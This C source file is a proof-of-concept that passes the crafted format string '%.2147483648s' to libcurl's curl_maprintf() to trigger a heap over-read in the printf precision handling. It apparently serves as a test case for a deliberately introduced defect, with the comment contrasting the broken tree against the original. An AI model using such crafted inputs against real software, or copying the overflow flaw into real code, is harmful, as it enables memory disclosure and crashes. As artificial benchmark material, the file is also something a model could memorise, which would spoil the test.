/* Proof-of-concept for a delocalized memory-safety defect in libcurl's
 * printf implementation, reached through the public curl_maprintf() API.
 *
 * Untrusted input: an attacker-controlled format string passed to the
 * mprintf surface. The format "%.2147483648s" carries a decimal precision
 * one past INT_MAX. On the resulting tree this precision is accepted by the
 * number parser (it should overflow and be rejected) and, cast to int,
 * becomes negative; out_string() then emits the argument with an unbounded
 * byte count derived from that negative precision, reading far past the end
 * of the short heap string. AddressSanitizer aborts on the over-read.
 *
 * On the original batch the parser rejects the oversized precision, so the
 * format is refused and nothing is emitted: no over-read, clean exit.
 */
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
  /* a short, heap-allocated, NUL-terminated string argument */
  char *s = malloc(2);
  char *out;
  if(!s)
    return 2;
  s[0] = 'x';
  s[1] = '\0';

  /* public mprintf API, attacker-controlled format string */
  out = curl_maprintf("%.2147483648s", s);

  if(out)
    curl_free(out);
  free(s);
  printf("done\n");
  return 0;
}
